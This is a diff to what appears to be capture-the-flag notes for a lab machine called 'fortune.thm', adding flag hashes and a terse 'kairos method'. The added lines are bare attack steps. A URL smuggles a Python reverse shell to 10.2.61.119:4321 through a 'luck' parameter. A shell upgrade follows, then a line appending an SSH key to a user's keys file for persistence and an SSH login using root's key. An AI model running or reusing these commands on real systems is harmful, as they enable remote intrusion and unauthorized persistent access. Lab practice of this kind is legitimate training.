@@ -142,3 +142,24 @@ d87728453a7a55bddb8e62b8c3aab359
 
 /usr/games/flag
 3373314cd03e4f4eb267e6e3c3ed0ae1
+
+
+
+
+
+
+
+
+
+
+                                              kairos method
+                                              
+http://fortune.thm/_styles/index.php?luck=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.61.119",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+echo "your user id_rsa" >> /home/kairos/.ssh/authenticated_keys
+
+ssh -i /root/.ssh/id_rsa kairos@fortune.thm
+
+while :; do ./lucky_shell ; done
